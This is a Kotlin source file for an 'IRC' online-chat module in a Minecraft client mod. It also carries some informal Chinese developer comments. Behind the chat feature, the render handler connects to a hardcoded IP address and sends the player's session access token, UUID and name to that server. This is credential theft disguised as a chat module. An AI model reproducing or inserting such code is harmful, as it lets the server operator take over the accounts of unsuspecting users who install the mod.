package dev.dyzjct.kura.module.modules.client

import base.events.RunGameLoopEvent
import base.events.render.Render3DEvent
import base.system.event.safeEventListener
import dev.dyzjct.kura.Kura
import dev.dyzjct.kura.module.Category
import dev.dyzjct.kura.module.Module
import helper.kura.socket.packet.GameInfoPacket
import net.minecraft.text.Text

object IRC : Module(
    name = "IRC",
    langName = "在线聊天",
    category = Category.CLIENT,
    safeModule = true
) {
    val mode by msetting("NoticeMode", Mode.Chat)

    private var lastName: String? = null
    override fun onEnable() {
        this.reset()
    }

    override fun onDisable() {
        this.reset()

        if (Kura.ircSocket.client.isConnected) {
            Kura.ircSocket.client.disconnect()
        }
    }

    init {
        onRender3D {
            onRender3D(it)
        }
    }

    // 你沒有
    // 你去問問其他人吧     你需要什么？ 我需要你编写出正确的event写法
    // xianzheyangba
    /*
        要在init里面写
         safeEventListener<Event> { 不写这条默认为it ->
        }
     */
    fun onRender3D(event: Render3DEvent) {
        val nameStr: Text? = mc.player?.name

        if (Kura.ircSocket.client.isConnected) {
            if (lastName == null || lastName != nameStr.toString()) {
                Kura.ircSocket.client.send(
                    GameInfoPacket(
                        nameStr.toString(),
                        mc.getSession().accessToken,
                        mc.getSession().uuid,
                        System.currentTimeMillis()
                    )
                )
                lastName = nameStr.toString()
            }
        } else {
            if (!Kura.ircSocket.client.isConnected) {
                Kura.ircSocket.client.start("154.9.27.109", 45600)
            }
        }
    }

    enum class Mode {
        Notification, Chat, Both
    }

    fun reset() {
        this.lastName = null
    }
}